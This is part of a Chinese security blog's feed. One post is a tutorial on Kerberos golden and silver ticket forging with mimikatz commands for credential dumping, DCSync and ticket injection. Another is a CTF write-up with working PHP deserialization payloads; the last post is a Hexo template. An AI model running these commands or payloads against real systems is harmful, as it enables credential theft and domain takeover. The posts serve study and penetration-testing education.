      <url>/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><ul><li><a href="#0x00__3">0x00 前提</a></li><li><a href="#0x01_Kerberos_7">0x01 Kerberos域认证</a></li><li><a href="#_41">域认证大致流程：</a></li><li><a href="#TGT___session_key_53">第一部分：生成TGT 和 session key</a></li><li><a href="#_server_ticket_79">第二步：获取要访问的 server ticket</a></li><li><a href="#__109">第三部 向客户端向服务器请求认证</a></li><li><a href="#0x01_Silver_Tickets_133">0x01 白银票据(Silver Tickets)</a></li><li><ul><li><a href="#Silver_Tickets_161">伪造白银票据(Silver Tickets)</a></li></ul></li><li><a href="#0x02_Golden_Ticket_220">0x02 黄金票据（Golden Ticket）</a></li><li><ul><li><a href="#_236">伪造黄金票据</a></li></ul></li><li><a href="#0x03__288">0x03 黄金票据和白银票据比较</a></li><li><a href="#0x04__300">0x04 参考</a></li></ul></li></ul><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket = 入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和 session key"></a>第一部分：生成TGT 和 session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 AreUSerialz反序列化题目</title>
      <link href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
      <url>/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>看了网鼎杯 AreUSerialz反序列化题目wp<br>对php的反序列化又有了学到了新的知识点，之前都没注意到</p><h2 id="标题题目是这样的："><a href="#标题题目是这样的：" class="headerlink" title="标题题目是这样的："></a>标题题目是这样的：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $op;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $filename;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line"></span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line"></span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line"></span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line"></span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看下代码,反序列化漏洞<br>protect里面可控</p><p>主要是绕过 is_vaild 函数,它规定了序列化内容中只能包含ascii可见字符</p><p>还有因为在进行read()之前就会调用__destruct()魔术方法<br>__destruct()方法内使用了严格相等 this-&gt;op === “2” process()<br>方法内使用了else if ( this-&gt;op == “2”)<br>所以这里使用弱类型2 == “2”绕过</p><h2 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h2><p>出题用的php版本比较高，public属性可以覆盖替代protected</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">"zeo"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"></span><br><span class="line">var_dump(is_valid($b));</span><br><span class="line">print_r($b);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200511210523671.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200511210452672.png" alt="在这里插入图片描述"></p><h2 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h2><p>下面P牛之前的解释</p><p>PHP序列化的时候private和protected变量会引入不可见字符\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，如图1，url编码后就可以看得很清楚了。<br>同理，protected属性会引入\x00*\x00。</p><p>此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。比如s:5:“A&lt;null_byte&gt;B”;̀ -&gt; S:5:“A\00B\09\0D”;</p><p>把序列号后的s变成S就可以了，里面的字符就可以正常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;S:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;S:<span class="number">6</span>:<span class="string">"loecho"</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/05/08/hello-world/"/>
      <url>/2020/05/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a 